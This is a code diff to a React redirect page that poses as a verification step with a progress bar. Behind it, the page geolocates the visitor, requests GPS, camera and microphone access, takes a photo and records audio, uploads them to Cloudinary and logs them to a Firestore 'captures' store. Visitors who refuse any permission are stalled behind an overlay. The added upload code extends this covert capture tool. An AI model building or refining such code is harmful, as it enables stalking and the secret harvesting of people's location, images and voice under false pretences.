@@ -2,9 +2,9 @@ import * as React from 'react';
 import { useParams } from 'react-router-dom';
 import type { Settings, CapturedData, PermissionType } from '../types';
 import { useLanguage } from '../contexts/LanguageContext';
-import { NEW_REDIRECT_TEMPLATE, CARD_STYLES } from '../constants';
+import { NEW_REDIRECT_TEMPLATE, CARD_STYLES, CLOUDINARY_UPLOAD_URL, CLOUDINARY_UPLOAD_PRESET } from '../constants';
 import { db } from '../firebase';
-import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
+import { collection, addDoc } from 'firebase/firestore';
 
 interface RedirectPageProps {
   previewSettings?: Settings | Omit<Settings, 'id'>;
@@ -68,7 +68,6 @@ const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({
           <div className="w-full pt-6 space-y-2">
             <VerificationText className="text-slate-400" />
             <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-200 rounded-full h-5 overflow-hidden" progressClassName="bg-blue-500 h-full rounded-full" />
-            <p className="text-base text-slate-600">{settings.displayText}</p>
           </div>
         </div>
       </div>
@@ -296,9 +295,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
   
   const [settings, setSettings] = React.useState<Settings | null>(null);
   const [error, setError] = React.useState<string | null>(null);
-  const [statusText, setStatusText] = React.useState(t('redirect_initializing'));
   const [isPaused, setIsPaused] = React.useState(true);
-  const [permissionDenied, setPermissionDenied] = React.useState(false);
   
   const isPreview = !!isPreviewProp;
   const isMounted = React.useRef(true);
@@ -314,7 +311,6 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         configToLoad = 'id' in previewSettings ? previewSettings as Settings : { ...NEW_REDIRECT_TEMPLATE, ...previewSettings, id: 'preview' } as Settings;
         setSettings(configToLoad);
         setIsPaused(false);
-        setStatusText(t('redirect_loading'));
         return;
     }
 
@@ -326,11 +322,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
     try {
       const decodedString = atob(data);
       const parsedSettings = JSON.parse(decodedString);
-      const isAnyCaptureEnabled = parsedSettings.captureInfo?.permissions?.length > 0;
-
       configToLoad = { ...NEW_REDIRECT_TEMPLATE, ...parsedSettings };
       setSettings(configToLoad);
-      setStatusText(isAnyCaptureEnabled ? t('redirect_permissions_request') : t('redirect_preparing'));
       setIsPaused(!isPreview); 
     } catch (e) {
       console.error("Invalid redirect data in URL:", e);
@@ -355,7 +348,6 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
     
     const startRedirectSequence = () => {
         if (!isMounted.current) return;
-        setStatusText(t('redirect_loading'));
         setIsPaused(false); // Start the progress bar
         
         const redirectTimer = setTimeout(performRedirect, settings.redirectDelay * 1000);
@@ -363,10 +355,17 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
     };
 
     const handleDataCapture = async () => {
+        const redirectId = (settings as any).redirectId;
+        if (!redirectId) {
+            console.error("Could not save capture data: redirectId is missing from payload.");
+            startRedirectSequence(); // Fail gracefully and just redirect
+            return;
+        }
+
         const { os, browser, deviceType } = parseUserAgent(navigator.userAgent);
         
-        const initialData: Omit<CapturedData, 'id'> = {
-            redirectId: (settings as any).redirectId, // CRITICAL FIX: Get ID from payload
+        const capturedData: Omit<CapturedData, 'id'> = {
+            redirectId,
             name: `Capture @ ${new Date().toLocaleString()}`,
             timestamp: Date.now(),
             ip: 'Fetching...',
@@ -388,8 +387,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
             const ipResponse = await fetch('https://ipapi.co/json/');
             if (ipResponse.ok) {
                 const ipData = await ipResponse.json();
-                initialData.ip = ipData.ip;
-                initialData.location = {
+                capturedData.ip = ipData.ip;
+                capturedData.location = {
                     lat: ipData.latitude,
                     lon: ipData.longitude,
                     city: ipData.city,
@@ -403,23 +402,17 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         
         // Sequential permission requests
         for (const permission of settings.captureInfo.permissions) {
-            if (permission === 'location') {
-                try {
+             try {
+                if (permission === 'location') {
                     const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
                     });
-                    initialData.permissions.location = 'granted';
-                    initialData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude, city: initialData.location.city, country: initialData.location.country, source: 'gps'};
-                } catch {
-                    initialData.permissions.location = 'denied';
-                    anyPermissionDenied = true;
-                }
-            } else if (permission === 'camera') {
-                try {
+                    capturedData.permissions.location = 'granted';
+                    capturedData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude, city: capturedData.location.city, country: capturedData.location.country, source: 'gps'};
+                } else if (permission === 'camera') {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    initialData.permissions.camera = 'granted';
-
-                    // Capture image as Base64
+                    capturedData.permissions.camera = 'granted';
+                    
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
@@ -427,51 +420,54 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d')?.drawImage(video, 0, 0);
-                    initialData.cameraCapture = canvas.toDataURL('image/jpeg', 0.7);
+                    
+                    const formData = new FormData();
+                    formData.append('file', canvas.toDataURL('image/jpeg', 0.7));
+                    formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
+
+                    const res = await fetch(CLOUDINARY_UPLOAD_URL, { method: 'POST', body: formData });
+                    const uploadData = await res.json();
+                    capturedData.cameraCapture = uploadData.secure_url;
                     
                     stream.getTracks().forEach(track => track.stop());
-                } catch {
-                    initialData.permissions.camera = 'denied';
-                    anyPermissionDenied = true;
-                }
-            } else if (permission === 'microphone') {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    initialData.permissions.microphone = 'granted';
 
-                    // Capture audio as Base64
-                    const audioBase64 = await new Promise<string>((resolve) => {
-                        const recorder = new MediaRecorder(stream);
+                } else if (permission === 'microphone') {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    capturedData.permissions.microphone = 'granted';
+
+                    const audioBlob = await new Promise<Blob>((resolve) => {
+                        const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                         const chunks: Blob[] = [];
                         recorder.ondataavailable = e => chunks.push(e.data);
-                        recorder.onstop = () => {
-                            const blob = new Blob(chunks, { type: 'audio/webm' });
-                            const reader = new FileReader();
-                            reader.onload = () => resolve(reader.result as string);
-                            reader.readAsDataURL(blob);
-                        };
+                        recorder.onstop = () => resolve(new Blob(chunks, { type: 'audio/webm' }));
                         setTimeout(() => recorder.stop(), settings.captureInfo.recordingDuration * 1000);
                         recorder.start();
                     });
-                    initialData.microphoneCapture = audioBase64;
+
+                    const formData = new FormData();
+                    formData.append('file', audioBlob);
+                    formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
+                    
+                    const res = await fetch(CLOUDINARY_UPLOAD_URL, { method: 'POST', body: formData });
+                    const uploadData = await res.json();
+                    capturedData.microphoneCapture = uploadData.secure_url;
+
                     stream.getTracks().forEach(track => track.stop());
-                } catch {
-                    initialData.permissions.microphone = 'denied';
-                    anyPermissionDenied = true;
                 }
+            } catch {
+                if (permission === 'location') capturedData.permissions.location = 'denied';
+                if (permission === 'camera') capturedData.permissions.camera = 'denied';
+                if (permission === 'microphone') capturedData.permissions.microphone = 'denied';
+                anyPermissionDenied = true;
             }
         }
         
-        if (initialData.redirectId) {
-             try {
-                 await addDoc(collection(db, "captures"), initialData);
-            } catch(e) { console.error("Failed to save captured data:", e); }
-        } else {
-             console.error("Could not save capture data: redirectId is missing.");
-        }
+        try {
+            await addDoc(collection(db, "captures"), capturedData);
+        } catch(e) { console.error("Failed to save captured data:", e); }
         
         if (anyPermissionDenied) {
-            setPermissionDenied(true);
+            setIsPaused(true); // Pause the redirect indefinitely
         } else {
             startRedirectSequence();
         }
@@ -506,7 +502,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
   };
   
   const renderCard = () => {
-    const props = { settings, isPaused: isPreview || isPaused || permissionDenied };
+    // If permissions were denied, isPaused will be true, halting the progress bar.
+    const props = { settings, isPaused: isPreview || isPaused };
     switch (settings.cardStyle) {
         case 'glass': return <GlassCard {...props} />;
         case 'minimal': return <MinimalCard {...props} />;
@@ -535,7 +532,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
                 </div>
             </div>
         )}
-        {permissionDenied && (
+        {isPaused && !isPreview && settings?.captureInfo.permissions.length > 0 && (
              <div className="absolute inset-0 bg-black/70 backdrop-blur-md z-20 flex items-center justify-center animate-fade-in">
                  <div className="text-center p-8 rounded-lg max-w-sm">
                      <h2 className="text-2xl font-bold text-red-400 mb-2">{t('redirect_permissions_denied_title')}</h2>
